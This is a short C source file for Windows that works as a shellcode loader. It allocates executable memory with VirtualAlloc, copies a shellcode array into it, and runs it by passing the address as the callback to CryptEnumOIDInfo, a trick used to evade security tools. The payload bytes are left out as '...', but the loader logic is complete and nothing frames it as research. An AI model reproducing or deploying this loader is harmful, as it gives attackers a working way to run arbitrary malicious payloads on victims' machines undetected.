#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>

unsigned char shellcode[] = ...

int main() {
    LPVOID address = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(address, &shellcode[0], sizeof(shellcode));
    CryptEnumOIDInfo(0, 0, NULL, (PFN_CRYPT_ENUM_OID_INFO)address);

    return 0;

}